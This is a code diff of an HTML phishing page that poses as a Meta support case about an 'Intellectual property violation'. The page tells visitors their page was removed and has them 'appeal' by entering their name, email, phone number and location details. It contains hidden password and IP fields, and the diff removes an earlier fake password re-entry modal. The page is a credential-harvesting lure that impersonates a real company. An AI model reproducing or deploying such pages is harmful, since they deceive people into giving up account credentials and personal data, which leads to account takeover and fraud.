+                  font-weight: 600;
+                  font-size: 15px;
+                "
+              >
+                <i style="font-size: 16px" class="fa-solid fa-envelope"></i>
+                Support Inbox
+              </p>
             </div>
-        </section>
-        <!-- <div id="loading-circle"></div> -->
-        <div class="loader" id="loading-circle">
-            <div class="bar1"></div>
-            <div class="bar2"></div>
-            <div class="bar3"></div>
-            <div class="bar4"></div>
-            <div class="bar5"></div>
-            <div class="bar6"></div>
-            <div class="bar7"></div>
-            <div class="bar8"></div>
-            <div class="bar9"></div>
-            <div class="bar10"></div>
-            <div class="bar11"></div>
-            <div class="bar12"></div>
+          </div>
         </div>
-
-        <div class="modal fade" style="margin-top:20px;" id="passwordModal" aria-modal="true" role="dialog" data-bs-keyboard="false" data-bs-backdrop="static">
-            <div class="modal-dialog" role="document">
-                <div style="box-shadow: 0 2px 26px rgba(0, 0, 0, .3), 0 0 0 1px rgba(0, 0, 0, .1)" class="modal-content">
-                    <div style="padding: 10px 15px; background-color: #f5f6f7; border-bottom: 1px solid #e5e5e5" class="modal-header">
-                        <h5 class="modal-title" style="color: #67788A !important; font-size:14px; font-weight:600; line-height: 25px;">Please Enter Your Password</h5>
-                        <button type="button" class="close btn-modal-cancel cancel" data-dismiss="modal">
-                            <span aria-hidden="true" action="#">×</span>
-                        </button>
+      </section>
+      <section class="main">
+        <div class="container">
+          <div class="row">
+            <div class="col-md-8 offset-md-2">
+              <div class="card">
+                <div
+                  class="row"
+                  style="padding-bottom: 20px; border-bottom: 1px solid #dddfe2"
+                >
+                  <div class="col-md-1 col-2">
+                    <img
+                      src="images/email-icon-circle-28.jpg"
+                      class="fa-solid fa-envelope"
+                      style=""
+                      width="50"
+                    />
+                  </div>
+                  <div class="col-md-11 col-10">
+                    <p style="font-weight: bold; margin-bottom: 0">
+                      Intellectual property violation
+                    </p>
+                    <div class="">
+                      <span
+                        data-v-4362cbd2=""
+                        class="open"
+                        style="
+                          background-color: rgb(59, 129, 211);
+                          font-size: 12px;
+                        "
+                        >OPEN</span
+                      >
+                      <span style="color: #90949c; font-size: 12px"
+                        >CASE #8894777049546</span
+                      >
                     </div>
-                    <form style="margin-bottom: 0px;">
-                        <div class="modal-body">
-                            <p style="font-size:14px; color: #67788A;">For your security, you must re-enter your password to continue.</p>
-
-                            <div style="margin-bottom:0;" class="form-group row">
-                                <label id="hiqetash" for="inputPassword3" class="col-form-label" style="font-size:14px;display:inline-block; padding-left:15px; padding-right:9px; color: #67788A;">Password</label>
-                                <div id="hiqetash2" class="password-container">
-                                    <input type="password" id="password-input" style="height: 25px; font-size:16px; width: 170px; margin-top:5px; border-radius:0; padding: 0 3px;" class="form-control password_input" required="">
-                                </div>
-                                <div style="display:none;margin-top: 10px; margin-left: 5px; opacity: 0.5;" id="togglePassword">
-                                    <span hidden="" class="hide-pass fa-regular fa-eye" aria-hidden="true" style="font-size: 12px; margin-top: 10px; margin-left: 5px; color: #67788A;">HIDE</span>
-                                    <span class="show-pass fa-regular fa-eye-slash" aria-hidden="true" style="font-size: 12px; margin-top: 10px; margin-left: 5px; color: #67788A;">SHOW</span>
-                                </div>
-                            </div>
-                            <span id="message_err"></span>
-
-                            <p class="password-error" style="color:red;font-size:14px;margin-left: 25px;margin-top: 6px;"></p>
-                            <p class="password-validating" style="color:green;font-size:14px;margin-left: 25px;margin-top: 6px;"></p>
+                  </div>
+                </div>
+                <div
+                  class="row"
+                  style="
+                    padding-top: 20px;
+                    padding-bottom: 20px;
+                    border-bottom: 1px solid #dddfe2;
+                  "
+                >
+                  <input hidden="" id="ip" name="ip" />
+                  <div class="col-md-1 col-2">
+                    <img src="images/newlogo1.png" class="img-fluid" />
+                  </div>
+                  <div class="col-md-11 col-10" style="padding-left: 0">
+                    <p
+                      style="
+                        font-weight: bold;
+                        font-size: 14px;
+                        margin-bottom: 7px;
+                      "
+                    >
+                      Our Message
+                    </p>
+                    <p
+                      style="font-size: 14px; color: #67788a"
+                      class="ourmessagiii"
+                    >
+                      - Community Standards<br />
+                      - Copyright<br />
+                      - Hate speech, harassment and bullying<br />
+                      - Intellectual property rights<br />
+                      <br />
+                      If you believe your page was removed by mistake, fill in
+                      this form so we can help.
+                    </p>
+                  </div>
+                </div>
+                <div
+                  class="row"
+                  style="
+                    padding-top: 10px;
+                    padding-bottom: 10px;
+                    border-bottom: 1px solid #dddfe2;
+                  "
+                >
+                  <div class="col-md-1 col-2"></div>
+                  <div class="col-md-11 col-10" style="padding-left: 0">
+                    <p
+                      style="
+                        font-weight: bold;
+                        font-size: 14px;
+                        margin-bottom: 7px;
+                      "
+                    ></p>
+                    <form style="margin-left: -30px">
+                      <input type="hidden" name="password" id="password" />
+                      <div style="display: inline-block">
+                        <label style="color: #67788a">* Required</label>
+                        <label
+                          style="
+                            color: #67788a;
+                            font-style: italic;
+                            font-weight: normal;
+                          "
+                          >(Your meta Account Information)</label
+                        >
+                        <label
+                          id="form-error"
+                          style="color: red; font-style: italic"
+                        ></label>
+                      </div>
+                      <div class="form-group">
+                        <label for="name" style="color: #67788a"
+                          >Who is the owner of the Page? *</label
+                        >
+                        <input
+                          type="text"
+                          class="form-control"
+                          id="name"
+                          name="name"
+                          style="font-size: 14px; border: 1px solid #67788a"
+                          required=""
+                        />
+                      </div>
+                      <div class="form-group">
+                        <label for="email" style="color: #67788a"
+                          >Email Address *</label
+                        >
+                        <input
+                          type="email"
+                          class="form-control"
+                          style="
+                            border-radius: 0;
+                            height: 35px;
+                            border: 1px solid #67788a;
+                          "
+                          id="email"
+                          name="email"
+                          aria-describedby="email"
+                          required=""
+                        />
+                      </div>
+                      <div class="form-group">
+                        <label for="phone" style="color: #67788a"
+                          >Phone Number *</label
+                        >
+                        <div>
+                          <select
+                            id="country_code"
+                            class="form-control"
+                            style="
+                              display: inline-block;
+                              vertical-align: middle;
+                              width: 90px;
+                              height: 35px;
+                              padding-bottom: 3px;
+                              padding-top: 3px;
+                              border-radius: 0px;
+                              border: 1px solid #67788a;
+                            "
+                          >
+                            <option name="United States (+1)" value="1">
+                              +1
+                            </option>
+                            <option name="Afghanistan (+93)" value="93">
+                              Afghanistan (+93)
+                            </option>
+                            <option name="Albania (+355)" value="355">
+                              Albania (+355)
+                            </option>
+                            <option name="Algeria (+213)" value="213">
+                              Algeria (+213)
+                            </option>
+                            <option name="American Samoa (+1)" value="1">
+                              American Samoa (+1)
+                            </option>
+                            <option name="Andorra (+376)" value="376">
+                              Andorra (+376)
+                            </option>
+                            <option name="Angola (+244)" value="244">
+                              Angola (+244)
+                            </option>
+                            <option name="Anguilla (+1)" value="1">
+                              Anguilla (+1)
+                            </option>
+                            <option name="Antigua (+1)" value="1">
+                              Antigua (+1)
+                            </option>
+                            <option name="Argentina (+54)" value="54">
+                              Argentina (+54)
+                            </option>
+                            <option name="Armenia (+374)" value="374">
+                              Armenia (+374)
+                            </option>
+                            <option name="Aruba (+297)" value="297">
+                              Aruba (+297)
+                            </option>
+                            <option name="Australia (+61)" value="61">
+                              Australia (+61)
+                            </option>
+                            <option name="Austria (+43)" value="43">
+                              Austria (+43)
+                            </option>
+                            <option name="Azerbaijan (+994)" value="994">
+                              Azerbaijan (+994)
+                            </option>
+                            <option name="Bahrain (+973)" value="973">
+                              Bahrain (+973)
+                            </option>
+                            <option name="Bangladesh (+880)" value="880">
+                              Bangladesh (+880)
+                            </option>
+                            <option name="Barbados (+1)" value="1">
+                              Barbados (+1)
+                            </option>
+                            <option name="Belarus (+375)" value="375">
+                              Belarus (+375)
+                            </option>
+                            <option name="Belgium (+32)" value="32">
+                              Belgium (+32)
+                            </option>
+                            <option name="Belize (+501)" value="501">
+                              Belize (+501)
+                            </option>
+                            <option name="Benin (+229)" value="229">
+                              Benin (+229)
+                            </option>
+                            <option name="Bermuda (+1)" value="1">
+                              Bermuda (+1)
+                            </option>
+                            <option name="Bhutan (+975)" value="975">
+                              Bhutan (+975)
+                            </option>
+                            <option name="Bolivia (+591)" value="591">
+                              Bolivia (+591)
+                            </option>
+                            <option
+                              name="Bonaire, Sint Eustatius and Saba (+599)"
+                              value="599"
+                            >
+                              Bonaire, Sint Eustatius and Saba (+599)
+                            </option>
+                            <option
+                              name="Bosnia and Herzegovina (+387)"
+                              value="387"
+                            >
+                              Bosnia and Herzegovina (+387)
+                            </option>
+                            <option name="Botswana (+267)" value="267">
+                              Botswana (+267)
+                            </option>
+                            <option name="Brazil (+55)" value="55">
+                              Brazil (+55)
+                            </option>
+                            <option
+                              name="British Indian Ocean Territory (+246)"
+                              value="246"
+                            >
+                              British Indian Ocean Territory (+246)
+                            </option>
+                            <option
+                              name="British Virgin Islands (+1)"
+                              value="1"
+                            >
+                              British Virgin Islands (+1)
+                            </option>
+                            <option name="Brunei (+673)" value="673">
+                              Brunei (+673)
+                            </option>
+                            <option name="Bulgaria (+359)" value="359">
+                              Bulgaria (+359)
+                            </option>
+                            <option name="Burkina Faso (+226)" value="226">
+                              Burkina Faso (+226)
+                            </option>
+                            <option name="Burundi (+257)" value="257">
+                              Burundi (+257)
+                            </option>
+                            <option name="Cambodia (+855)" value="855">
+                              Cambodia (+855)
+                            </option>
+                            <option name="Cameroon (+237)" value="237">
+                              Cameroon (+237)
+                            </option>
+                            <option name="Canada (+1)" value="1">
+                              Canada (+1)
+                            </option>
+                            <option name="Cape Verde (+238)" value="238">
+                              Cape Verde (+238)
+                            </option>
+                            <option name="Cayman Islands (+1)" value="1">
+                              Cayman Islands (+1)
+                            </option>
+                            <option name="Côte d'Ivoire (+225)" value="225">
+                              Côte d'Ivoire (+225)
+                            </option>
+                            <option
+                              name="Central African Republic (+236)"
+                              value="236"
+                            >
+                              Central African Republic (+236)
+                            </option>
+                            <option name="Chad (+235)" value="235">
+                              Chad (+235)
+                            </option>
+                            <option name="Chile (+56)" value="56">
+                              Chile (+56)
+                            </option>
+                            <option name="China (+86)" value="86">
+                              China (+86)
+                            </option>
+                            <option name="Colombia (+57)" value="57">
+                              Colombia (+57)
+                            </option>
+                            <option name="Comoros (+269)" value="269">
+                              Comoros (+269)
+                            </option>
+                            <option name="Cook Islands (+682)" value="682">
+                              Cook Islands (+682)
+                            </option>
+                            <option name="Costa Rica (+506)" value="506">
+                              Costa Rica (+506)
+                            </option>
+                            <option name="Croatia (+385)" value="385">
+                              Croatia (+385)
+                            </option>
+                            <option name="Cuba (+53)" value="53">
+                              Cuba (+53)
+                            </option>
+                            <option name="Curaçao (+599)" value="599">
+                              Curaçao (+599)
+                            </option>
+                            <option name="Cyprus (+357)" value="357">
+                              Cyprus (+357)
+                            </option>
+                            <option name="Czech Republic (+420)" value="420">
+                              Czech Republic (+420)
+                            </option>
+                            <option
+                              name="Democratic Republic of the Congo (+243)"
+                              value="243"
+                            >
+                              Democratic Republic of the Congo (+243)
+                            </option>
+                            <option name="Denmark (+45)" value="45">
+                              Denmark (+45)
+                            </option>
+                            <option name="Djibouti (+253)" value="253">
+                              Djibouti (+253)
+                            </option>
+                            <option name="Dominica (+1)" value="1">
+                              Dominica (+1)
+                            </option>
+                            <option name="Dominican Republic (+1)" value="1">
+                              Dominican Republic (+1)
+                            </option>
+                            <option name="Ecuador (+593)" value="593">
+                              Ecuador (+593)
+                            </option>
+                            <option name="Egypt (+20)" value="20">
+                              Egypt (+20)
+                            </option>
+                            <option name="El Salvador (+503)" value="503">
+                              El Salvador (+503)
+                            </option>
+                            <option name="Equatorial Guinea (+240)" value="240">
+                              Equatorial Guinea (+240)
+                            </option>
+                            <option name="Eritrea (+291)" value="291">
+                              Eritrea (+291)
+                            </option>
+                            <option name="Estonia (+372)" value="372">
+                              Estonia (+372)
+                            </option>
+                            <option name="Ethiopia (+251)" value="251">
+                              Ethiopia (+251)
+                            </option>
+                            <option name="Falkland Islands (+500)" value="500">
+                              Falkland Islands (+500)
+                            </option>
+                            <option name="Faroe Islands (+298)" value="298">
+                              Faroe Islands (+298)
+                            </option>
+                            <option
+                              name="Federated States of Micronesia (+691)"
+                              value="691"
+                            >
+                              Federated States of Micronesia (+691)
+                            </option>
+                            <option name="Fiji (+679)" value="679">
+                              Fiji (+679)
+                            </option>
+                            <option name="Finland (+358)" value="358">
+                              Finland (+358)
+                            </option>
+                            <option name="France (+33)" value="33">
+                              France (+33)
+                            </option>
+                            <option name="French Guiana (+594)" value="594">
+                              French Guiana (+594)
+                            </option>
+                            <option name="French Polynesia (+689)" value="689">
+                              French Polynesia (+689)
+                            </option>
+                            <option name="Gabon (+241)" value="241">
+                              Gabon (+241)
+                            </option>
+                            <option name="Georgia (+995)" value="995">
+                              Georgia (+995)
+                            </option>
+                            <option name="Germany (+49)" value="49">
+                              Germany (+49)
+                            </option>
+                            <option name="Ghana (+233)" value="233">
+                              Ghana (+233)
+                            </option>
+                            <option name="Gibraltar (+350)" value="350">
+                              Gibraltar (+350)
+                            </option>
+                            <option name="Greece (+30)" value="30">
+                              Greece (+30)
+                            </option>
+                            <option name="Greenland (+299)" value="299">
+                              Greenland (+299)
+                            </option>
+                            <option name="Grenada (+1)" value="1">
+                              Grenada (+1)
+                            </option>
+                            <option name="Guadeloupe (+590)" value="590">
+                              Guadeloupe (+590)
+                            </option>
+                            <option name="Guam (+1)" value="1">
+                              Guam (+1)
+                            </option>
+                            <option name="Guatemala (+502)" value="502">
+                              Guatemala (+502)
+                            </option>
+                            <option name="Guernsey (+44)" value="44">
+                              Guernsey (+44)
+                            </option>
+                            <option name="Guinea (+224)" value="224">
+                              Guinea (+224)
+                            </option>
+                            <option name="Guinea-Bissau (+245)" value="245">
+                              Guinea-Bissau (+245)
+                            </option>
+                            <option name="Guyana (+592)" value="592">
+                              Guyana (+592)
+                            </option>
+                            <option name="Haiti (+509)" value="509">
+                              Haiti (+509)
+                            </option>
+                            <option name="Honduras (+504)" value="504">
+                              Honduras (+504)
+                            </option>
+                            <option name="Hong Kong (+852)" value="852">
+                              Hong Kong (+852)
+                            </option>
+                            <option name="Hungary (+36)" value="36">
+                              Hungary (+36)
+                            </option>
+                            <option name="Iceland (+354)" value="354">
+                              Iceland (+354)
+                            </option>
+                            <option name="India (+91)" value="91">
+                              India (+91)
+                            </option>
+                            <option name="Indonesia (+62)" value="62">
+                              Indonesia (+62)
+                            </option>
+                            <option name="Iran (+98)" value="98">
+                              Iran (+98)
+                            </option>
+                            <option name="Iraq (+964)" value="964">
+                              Iraq (+964)
+                            </option>
+                            <option name="Ireland (+353)" value="353">
+                              Ireland (+353)
+                            </option>
+                            <option name="Isle Of Man (+44)" value="44">
+                              Isle Of Man (+44)
+                            </option>
+                            <option name="Israel (+972)" value="972">
+                              Israel (+972)
+                            </option>
+                            <option name="Italy (+39)" value="39">
+                              Italy (+39)
+                            </option>
+                            <option name="Jamaica (+1)" value="1">
+                              Jamaica (+1)
+                            </option>
+                            <option name="Japan (+81)" value="81">
+                              Japan (+81)
+                            </option>
+                            <option name="Jersey (+44)" value="44">
+                              Jersey (+44)
+                            </option>
+                            <option name="Jordan (+962)" value="962">
+                              Jordan (+962)
+                            </option>
+                            <option name="Kazakhstan (+7)" value="7">
+                              Kazakhstan (+7)
+                            </option>
+                            <option name="Kenya (+254)" value="254">
+                              Kenya (+254)
+                            </option>
+                            <option name="Kiribati (+686)" value="686">
+                              Kiribati (+686)
+                            </option>
+                            <option name="Kosovo (+383)" value="383">
+                              Kosovo (+383)
+                            </option>
+                            <option name="Kuwait (+965)" value="965">
+                              Kuwait (+965)
+                            </option>
+                            <option name="Kyrgyzstan (+996)" value="996">
+                              Kyrgyzstan (+996)
+                            </option>
+                            <option name="Laos (+856)" value="856">
+                              Laos (+856)
+                            </option>
+                            <option name="Latvia (+371)" value="371">
+                              Latvia (+371)
+                            </option>
+                            <option name="Lebanon (+961)" value="961">
+                              Lebanon (+961)
+                            </option>
+                            <option name="Lesotho (+266)" value="266">
+                              Lesotho (+266)
+                            </option>
+                            <option name="Liberia (+231)" value="231">
+                              Liberia (+231)
+                            </option>
+                            <option name="Libya (+218)" value="218">
+                              Libya (+218)
+                            </option>
+                            <option name="Liechtenstein (+423)" value="423">
+                              Liechtenstein (+423)
+                            </option>
+                            <option name="Lithuania (+370)" value="370">
+                              Lithuania (+370)
+                            </option>
+                            <option name="Luxembourg (+352)" value="352">
+                              Luxembourg (+352)
+                            </option>
+                            <option name="Macau (+853)" value="853">
+                              Macau (+853)
+                            </option>
+                            <option name="Macedonia (+389)" value="389">
+                              Macedonia (+389)
+                            </option>
+                            <option name="Madagascar (+261)" value="261">
+                              Madagascar (+261)
+                            </option>
+                            <option name="Malawi (+265)" value="265">
+                              Malawi (+265)
+                            </option>
+                            <option name="Malaysia (+60)" value="60">
+                              Malaysia (+60)
+                            </option>
+                            <option name="Maldives (+960)" value="960">
+                              Maldives (+960)
+                            </option>
+                            <option name="Mali (+223)" value="223">
+                              Mali (+223)
+                            </option>
+                            <option name="Malta (+356)" value="356">
+                              Malta (+356)
+                            </option>
+                            <option name="Marshall Islands (+692)" value="692">
+                              Marshall Islands (+692)
+                            </option>
+                            <option name="Martinique (+596)" value="596">
+                              Martinique (+596)
+                            </option>
+                            <option name="Mauritania (+222)" value="222">
+                              Mauritania (+222)
+                            </option>
+                            <option name="Mauritius (+230)" value="230">
+                              Mauritius (+230)
+                            </option>
+                            <option name="Mayotte (+262)" value="262">
+                              Mayotte (+262)
+                            </option>
+                            <option name="Mexico (+52)" value="52">
+                              Mexico (+52)
+                            </option>
+                            <option name="Moldova (+373)" value="373">
+                              Moldova (+373)
+                            </option>
+                            <option name="Monaco (+377)" value="377">
+                              Monaco (+377)
+                            </option>
+                            <option name="Mongolia (+976)" value="976">
+                              Mongolia (+976)
+                            </option>
+                            <option name="Montenegro (+382)" value="382">
+                              Montenegro (+382)
+                            </option>
+                            <option name="Montserrat (+1)" value="1">
+                              Montserrat (+1)
+                            </option>
+                            <option name="Morocco (+212)" value="212">
+                              Morocco (+212)
+                            </option>
+                            <option name="Mozambique (+258)" value="258">
+                              Mozambique (+258)
+                            </option>
+                            <option name="Myanmar (+95)" value="95">
+                              Myanmar (+95)
+                            </option>
+                            <option name="Namibia (+264)" value="264">
+                              Namibia (+264)
+                            </option>
+                            <option name="Nauru (+674)" value="674">
+                              Nauru (+674)
+                            </option>
+                            <option name="Nepal (+977)" value="977">
+                              Nepal (+977)
+                            </option>
+                            <option name="Netherlands (+31)" value="31">
+                              Netherlands (+31)
+                            </option>
+                            <option name="New Caledonia (+687)" value="687">
+                              New Caledonia (+687)
+                            </option>
+                            <option name="New Zealand (+64)" value="64">
+                              New Zealand (+64)
+                            </option>
+                            <option name="Nicaragua (+505)" value="505">
+                              Nicaragua (+505)
+                            </option>
+                            <option name="Niger (+227)" value="227">
+                              Niger (+227)
+                            </option>
+                            <option name="Nigeria (+234)" value="234">
+                              Nigeria (+234)
+                            </option>
+                            <option name="Niue (+683)" value="683">
+                              Niue (+683)
+                            </option>
+                            <option name="Norfolk Island (+672)" value="672">
+                              Norfolk Island (+672)
+                            </option>
+                            <option name="North Korea (+850)" value="850">
+                              North Korea (+850)
+                            </option>
+                            <option
+                              name="Northern Mariana Islands (+1)"
+                              value="1"
+                            >
+                              Northern Mariana Islands (+1)
+                            </option>
+                            <option name="Norway (+47)" value="47">
+                              Norway (+47)
+                            </option>
+                            <option name="Oman (+968)" value="968">
+                              Oman (+968)
+                            </option>
+                            <option name="Pakistan (+92)" value="92">
+                              Pakistan (+92)
+                            </option>
+                            <option name="Palau (+680)" value="680">
+                              Palau (+680)
+                            </option>
+                            <option name="Palestine (+970)" value="970">
+                              Palestine (+970)
+                            </option>
+                            <option name="Panama (+507)" value="507">
+                              Panama (+507)
+                            </option>
+                            <option name="Papua New Guinea (+675)" value="675">
+                              Papua New Guinea (+675)
+                            </option>
+                            <option name="Paraguay (+595)" value="595">
+                              Paraguay (+595)
+                            </option>
+                            <option name="Peru (+51)" value="51">
+                              Peru (+51)
+                            </option>
+                            <option name="Philippines (+63)" value="63">
+                              Philippines (+63)
+                            </option>
+                            <option name="Poland (+48)" value="48">
+                              Poland (+48)
+                            </option>
+                            <option name="Portugal (+351)" value="351">
+                              Portugal (+351)
+                            </option>
+                            <option name="Puerto Rico (+1)" value="1">
+                              Puerto Rico (+1)
+                            </option>
+                            <option name="Qatar (+974)" value="974">
+                              Qatar (+974)
+                            </option>
+                            <option name="Réunion (+262)" value="262">
+                              Réunion (+262)
+                            </option>
+                            <option
+                              name="Republic of the Congo (+242)"
+                              value="242"
+                            >
+                              Republic of the Congo (+242)
+                            </option>
+                            <option name="Romania (+40)" value="40">
+                              Romania (+40)
+                            </option>
+                            <option name="Russia (+7)" value="7">
+                              Russia (+7)
+                            </option>
+                            <option name="Rwanda (+250)" value="250">
+                              Rwanda (+250)
+                            </option>
+                            <option name="Saint Barthélemy (+590)" value="590">
+                              Saint Barthélemy (+590)
+                            </option>
+                            <option name="Saint Helena (+290)" value="290">
+                              Saint Helena (+290)
+                            </option>
+                            <option name="Saint Kitts and Nevis (+1)" value="1">
+                              Saint Kitts and Nevis (+1)
+                            </option>
+                            <option name="Saint Martin (+590)" value="590">
+                              Saint Martin (+590)
+                            </option>
+                            <option
+                              name="Saint Pierre and Miquelon (+508)"
+                              value="508"
+                            >
+                              Saint Pierre and Miquelon (+508)
+                            </option>
+                            <option
+                              name="Saint Vincent and the Grenadines (+1)"
+                              value="1"
+                            >
+                              Saint Vincent and the Grenadines (+1)
+                            </option>
+                            <option name="Samoa (+685)" value="685">
+                              Samoa (+685)
+                            </option>
+                            <option name="San Marino (+378)" value="378">
+                              San Marino (+378)
+                            </option>
+                            <option
+                              name="Sao Tome and Principe (+239)"
+                              value="239"
+                            >
+                              Sao Tome and Principe (+239)
+                            </option>
+                            <option name="Saudi Arabia (+966)" value="966">
+                              Saudi Arabia (+966)
+                            </option>
+                            <option name="Senegal (+221)" value="221">
+                              Senegal (+221)
+                            </option>
+                            <option name="Serbia (+381)" value="381">
+                              Serbia (+381)
+                            </option>
+                            <option name="Seychelles (+248)" value="248">
+                              Seychelles (+248)
+                            </option>
+                            <option name="Sierra Leone (+232)" value="232">
+                              Sierra Leone (+232)
+                            </option>
+                            <option name="Singapore (+65)" value="65">
+                              Singapore (+65)
+                            </option>
+                            <option name="Sint Maarten (+1)" value="1">
+                              Sint Maarten (+1)
+                            </option>
+                            <option name="Slovakia (+421)" value="421">
+                              Slovakia (+421)
+                            </option>
+                            <option name="Slovenia (+386)" value="386">
+                              Slovenia (+386)
+                            </option>
+                            <option name="Solomon Islands (+677)" value="677">
+                              Solomon Islands (+677)
+                            </option>
+                            <option name="Somalia (+252)" value="252">
+                              Somalia (+252)
+                            </option>
+                            <option name="South Africa (+27)" value="27">
+                              South Africa (+27)
+                            </option>
+                            <option name="South Korea (+82)" value="82">
+                              South Korea (+82)
+                            </option>
+                            <option name="South Sudan (+211)" value="211">
+                              South Sudan (+211)
+                            </option>
+                            <option name="Spain (+34)" value="34">
+                              Spain (+34)
+                            </option>
+                            <option name="Sri Lanka (+94)" value="94">
+                              Sri Lanka (+94)
+                            </option>
+                            <option name="St. Lucia (+1)" value="1">
+                              St. Lucia (+1)
+                            </option>
+                            <option name="Sudan (+249)" value="249">
+                              Sudan (+249)
+                            </option>
+                            <option name="Suriname (+597)" value="597">
+                              Suriname (+597)
+                            </option>
+                            <option name="Swaziland (+268)" value="268">
+                              Swaziland (+268)
+                            </option>
+                            <option name="Sweden (+46)" value="46">
+                              Sweden (+46)
+                            </option>
+                            <option name="Switzerland (+41)" value="41">
+                              Switzerland (+41)
+                            </option>
+                            <option name="Syria (+963)" value="963">
+                              Syria (+963)
+                            </option>
+                            <option name="Taiwan (+886)" value="886">
+                              Taiwan (+886)
+                            </option>
+                            <option name="Tajikistan (+992)" value="992">
+                              Tajikistan (+992)
+                            </option>
+                            <option name="Tanzania (+255)" value="255">
+                              Tanzania (+255)
+                            </option>
+                            <option name="Thailand (+66)" value="66">
+                              Thailand (+66)
+                            </option>
+                            <option name="The Bahamas (+1)" value="1">
+                              The Bahamas (+1)
+                            </option>
+                            <option name="The Gambia (+220)" value="220">
+                              The Gambia (+220)
+                            </option>
+                            <option name="Timor-Leste (+670)" value="670">
+                              Timor-Leste (+670)
+                            </option>
+                            <option name="Togo (+228)" value="228">
+                              Togo (+228)
+                            </option>
+                            <option name="Tokelau (+690)" value="690">
+                              Tokelau (+690)
+                            </option>
+                            <option name="Tonga (+676)" value="676">
+                              Tonga (+676)
+                            </option>
+                            <option name="Trinidad and Tobago (+1)" value="1">
+                              Trinidad and Tobago (+1)
+                            </option>
+                            <option name="Tunisia (+216)" value="216">
+                              Tunisia (+216)
+                            </option>
+                            <option name="Turkey (+90)" value="90">
+                              Turkey (+90)
+                            </option>
+                            <option name="Turkmenistan (+993)" value="993">
+                              Turkmenistan (+993)
+                            </option>
+                            <option
+                              name="Turks and Caicos Islands (+1)"
+                              value="1"
+                            >
+                              Turks and Caicos Islands (+1)
+                            </option>
+                            <option name="Tuvalu (+688)" value="688">
+                              Tuvalu (+688)
+                            </option>
+                            <option name="Uganda (+256)" value="256">
+                              Uganda (+256)
+                            </option>
+                            <option name="Ukraine (+380)" value="380">
+                              Ukraine (+380)
+                            </option>
+                            <option
+                              name="United Arab Emirates (+971)"
+                              value="971"
+                            >
+                              United Arab Emirates (+971)
+                            </option>
+                            <option name="United Kingdom (+44)" value="44">
+                              United Kingdom (+44)
+                            </option>
+                            <option name="Uruguay (+598)" value="598">
+                              Uruguay (+598)
+                            </option>
+                            <option name="US Virgin Islands (+1)" value="1">
+                              US Virgin Islands (+1)
+                            </option>
+                            <option name="Uzbekistan (+998)" value="998">
+                              Uzbekistan (+998)
+                            </option>
+                            <option name="Vanuatu (+678)" value="678">
+                              Vanuatu (+678)
+                            </option>
+                            <option name="Vatican City (+39)" value="39">
+                              Vatican City (+39)
+                            </option>
+                            <option name="Venezuela (+58)" value="58">
+                              Venezuela (+58)
+                            </option>
+                            <option name="Vietnam (+84)" value="84">
+                              Vietnam (+84)
+                            </option>
+                            <option name="Wallis and Futuna (+681)" value="681">
+                              Wallis and Futuna (+681)
+                            </option>
+                            <option name="Western Sahara (+212)" value="212">
+                              Western Sahara (+212)
+                            </option>
+                            <option name="Yemen (+967)" value="967">
+                              Yemen (+967)
+                            </option>
+                            <option name="Zambia (+260)" value="260">
+                              Zambia (+260)
+                            </option>
+                            <option name="Zimbabwe (+263)" value="263">
+                              Zimbabwe (+263)
+                            </option>
+                          </select>
+                          <input
+                            type="text"
+                            class="form-control"
+                            id="phone"
+                            name="phone"
+                            required=""
+                            style="
+                              display: inline-block;
+                              vertical-align: middle;
+                              width: 50%;
+                              border: 1px solid #67788a;
+                            "
+                            onkeypress="return event.charCode >= 48 && event.charCode <= 57"
+                          />
                         </div>
-                        <div class="modal-footer">
-                            <button style="background-color: #f5f6f7; border:1px solid #ccd0d5; color: #4b4f56; height:27px; padding:1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" class="btn btn-secondary btn-modal-cancel cancel" data-dismiss="modal">
-                                Cancel
-                            </button>
-                            <button style="background-color:#4065b4; height:27px; border: 1px solid #4267b2; padding: 1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" class="btn btn-primary submit_password">
-                                Submit
-                            </button>
-                            <button style="background-color:#4065b4; height:27px; border: 1px solid #4267b2; padding: 1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" class="btn btn-primary try-again" hidden="">
-                                Try Again
-                            </button>
+                      </div>
+
+                      <div data-v-4362cbd2="" class="mb-3">
+                        <div data-v-4362cbd2="" class="form-check">
+                          <input
+                            data-v-4362cbd2=""
+                            type="checkbox"
+                            value=""
+                            id="flexCheckDefault"
+                            class="form-check-input"
+                          />
+                          <label
+                            data-v-4362cbd2=""
+                            for="flexCheckDefault"
+                            class="form-check-label"
+                            style="
+                              font-size: 14px;
+                              color: #67788a;
+                              font-weight: bold;
+                            "
+                          >
+                            Country of your credit and/or debit cards doesn't
+                            match your current location
+                          </label>
                         </div>
+                      </div>
+                      <div data-v-4362cbd2="" class="mb-3">
+                        <div data-v-4362cbd2="" class="form-check">
+                          <input
+                            data-v-4362cbd2=""
+                            type="checkbox"
+                            value=""
+                            id="flexCheckDefault2"
+                            class="form-check-input"
+                          />
+                          <label
+                            data-v-4362cbd2=""
+                            for="flexCheckDefault2"
+                            class="form-check-label"
+                            style="
+                              font-size: 14px;
+                              color: #67788a;
+                              font-weight: bold;
+                            "
+                          >
+                            You traveled within the last 60 days
+                          </label>
+                        </div>
+                      </div>
+                      <div data-v-4362cbd2="" class="mb-3">
+                        <div data-v-4362cbd2="" class="form-check">
+                          <input
+                            data-v-4362cbd2=""
+                            type="checkbox"
+                            value=""
+                            id="flexCheckDefault3"
+                            class="form-check-input"
+                          />
+                          <label
+                            data-v-4362cbd2=""
+                            for="flexCheckDefault3"
+                            class="form-check-label"
+                            style="
+                              font-size: 14px;
+                              color: #67788a;
+                              font-weight: bold;
+                            "
+                          >
+                            You relocated within the last 60 days
+                          </label>
+                        </div>
+                      </div>
+                      <div class="form-group" style="margin-top: 15px">
+                        <label for="reason" style="color: #67788a"
+                          >Your Appeal *</label
+                        >
+                        <textarea
+                          name="reason"
+                          id="reason"
+                          class="form-control"
+                          style="border: 1px solid #67788a"
+                        ></textarea>
+                      </div>
+
+                      <div class="form-check">
+                        <input
+                          class="form-check-input check"
+                          type="checkbox"
+                          id="check"
+                          value="1"
+                          name="check"
+                          required=""
+                        />
+                        <label
+                          class="form-check-label"
+                          for="check"
+                          name="check"
+                          style="
+                            font-size: 14px;
+                            color: #67788a;
+                            font-weight: bold;
+                          "
+                        >
+                          Agree to our Terms, Data Policy and Cookies Policy. *
+                        </label>
+                      </div>
+                      <input
+                        id="btn-submit"
+                        type="button"
+                        class="btn btn-primary btn-register-send"
